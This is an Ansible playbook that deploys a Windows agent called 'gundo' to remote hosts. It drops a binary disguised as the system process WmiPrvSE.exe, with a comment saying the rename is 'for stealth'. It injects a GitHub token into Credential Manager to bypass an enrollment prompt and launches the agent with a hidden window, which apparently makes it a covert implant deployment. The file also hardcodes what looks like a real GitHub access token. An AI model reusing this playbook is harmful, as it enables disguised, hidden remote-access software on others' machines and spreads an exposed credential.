---
- name: Deploy and Enroll System Management Service
  hosts: windows_targets
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
    
    # The path where Go's os.UserConfigDir() puts the state file on Windows
    # It's usually C:\Users\<USER>\AppData\Roaming\gundo\state.json
    state_file: 'C:\Users\{{ ansible_user }}\AppData\Roaming\gundo\state.json'
    
    # PUT YOUR GITHUB TOKEN HERE
    github_token: "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"

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary (renamed for stealth)
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Check if the agent is already enrolled
      ansible.windows.win_stat:
        path: "{{ state_file }}"
      register: state_check

    # --- BYPASS PROMPT: INJECT TOKEN INTO WINDOWS CREDENTIAL MANAGER ---
    - name: Inject GitHub token into Windows Credential Manager
      ansible.windows.win_shell: |
        # This uses the cmdkey utility to save the token exactly as go-keyring expects it.
        # The target format for go-keyring on Windows is "service/account"
        $target = "gundo/github:mamadub03/gundo-test-repo"
        
        # Save the credential
        cmdkey /generic:$target /user:token /pass:"{{ github_token }}"
        
        # Verify it was saved
        $check = cmdkey /list:$target
        if ($check -match "gundo") {
            Write-Host "Token successfully injected into Credential Manager"
        } else {
            Write-Error "Failed to inject token"
            exit 1
        }
      when: not state_check.stat.exists

    # --- LAUNCH HIDDEN: THE CLIENT WILL AUTO-ENROLL ---
    - name: Launch agent hidden in the background
      ansible.windows.win_shell: |
        # The client will now find the token in the credential manager, 
        # skip the prompt, and auto-enroll to create state.json.
        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
      when: not state_check.stat.exists

    # --- IF ALREADY ENROLLED: JUST LAUNCH ---
    - name: Launch agent hidden (already enrolled)
      ansible.windows.win_shell: |
        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
      when: state_check.stat.exists
